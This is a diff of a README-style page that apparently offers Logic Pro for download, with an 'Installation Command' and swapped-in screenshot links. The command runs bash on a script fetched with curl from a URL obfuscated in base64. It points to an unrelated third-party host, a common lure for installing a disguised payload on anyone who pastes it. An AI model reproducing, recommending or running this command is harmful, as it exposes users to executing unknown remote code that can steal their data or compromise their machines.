@@ -14,15 +14,17 @@ With advanced features like multi-track recording, MIDI editing, virtual instrum
 
 ### 💻 Installation Command:
     /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nb3IvaW5zdGFsbC5zaA== | base64 -d))"
-![Guide](https://i.postimg.cc/NfzQxpMT/0723-1.gif)  
+
+![Guide](https://i.postimg.cc/NfzQxpMT/0723-1.gif)
+
 ---
 
 ## 🎬 Overview  
 
 A quick look at key parts in action:  
 
-![Logic Pro Screenshot 1](https://example.com/logic1.png)  
-![Logic Pro Screenshot 2](https://example.com/logic2.png)  
+![Logic Pro Screenshot 1](https://avatars.mds.yandex.net/i?id=f2f0191865c1ed094aa7c3ba2a828f71_l-5223638-images-thumbs&n=13)  
+![Logic Pro Screenshot 2](https://frankfurt.apollo.olxcdn.com/v1/files/uzdsq4y9ualx1-KZ/image;s=1867x1167)  
 
 ---
 
